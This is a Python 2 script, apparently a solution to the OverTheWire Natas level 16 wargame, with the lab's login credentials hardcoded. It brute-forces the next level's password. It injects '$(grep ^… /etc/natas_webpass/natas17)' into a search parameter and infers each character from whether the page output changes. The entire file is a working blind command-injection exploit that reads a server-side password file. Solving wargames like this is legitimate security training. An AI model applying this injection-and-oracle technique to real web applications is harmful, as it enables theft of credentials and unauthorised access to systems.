import httplib
import urllib
import base64
import datetime
 
CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
CREDS = "natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
HOST = "natas16.natas.labs.overthewire.org"
 
conn = httplib.HTTPConnection(HOST)
headers = {"Authorization": "Basic %s" % (base64.b64encode(CREDS))}
 
startTime = datetime.datetime.now().strftime("%m/%d/%Y %I:%M %p")
 
 
print("\n\t\033[33;1m---===[ Natas 16 Grep Bruteforcer ]===---\033[0m\n")
print(" [*] Brute force Started!")
 
i = 0
passwd = ""
while i != 32:
	for c in CHARSET:
		passwd += c
		needle = urllib.quote_plus("$(grep ^" + passwd + ".* /etc/natas_webpass/natas17)Africans")
		conn.request("GET", "/?needle=" + needle + "&submit=Search", "", headers)
		res = conn.getresponse()
		if res.status == 200:
			data = res.read()
			if data.find("Africans") < 0:
				print(" [*] %02d => Current Password: %s" % (i+1,passwd))
				i += 1
				break
			else:
				passwd = passwd[:-1]
		else:
			print(" \033[31;1m[*] Got HTTP status:\033[0m %d" % (res.status))
		conn.close()
print(" [*] Think we got it : %s" % (passwd))
endTime = datetime.datetime.now().strftime("%m/%d/%Y %I:%M %p")
print(" [*] Start Time: %s" % (startTime))
print(" [*] End Time: %s" % (endTime))
